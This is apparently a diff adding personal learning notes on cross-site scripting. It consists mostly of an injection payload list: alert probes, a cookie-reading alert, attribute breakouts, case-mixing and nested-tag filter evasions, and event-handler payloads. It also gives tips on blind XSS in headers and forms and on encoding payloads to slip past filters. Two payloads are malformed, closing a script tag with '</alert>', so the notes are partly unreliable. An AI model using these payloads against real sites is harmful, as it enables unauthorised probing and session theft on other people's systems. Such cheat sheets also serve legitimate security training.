@@ -1,0 +1,27 @@
+XSS:
+
+-To execute javascript payloads on web applications with an intention to execute those without proper input validation by the web application
+
+1. At any search from or input from
+2. Hunt for xss on different parameters
+
+alert(1) or prompt("Defronix")
+
+<script>alert(1)</alert>
+<script>alert("Hacked")</alert>
+<script>alert(document.cookie)</script>
+"><script>alert("FUCKED")</script>
+';alert('THM');//
+<img src=x onerror=alert("THM")>
+<sscriptcript>alert('THM')</sscriptcript>
+<SCRIPT>alert('THM')</SCRIPT>
+<ScRiPt>alert('THM')</ScRiPt>
+/images/cat.jpg" onload="
+"><img src=x onerror=alert("THM")>//
+
+BXSS > comment box, signup box, contact form, feedback form, referer, host header, header, origin and user agent and any parameters
+
+
+--> If you see that paylaod is filtering try to encode much time
+--> BXSS and burp collaborator for using BXSS
+ 
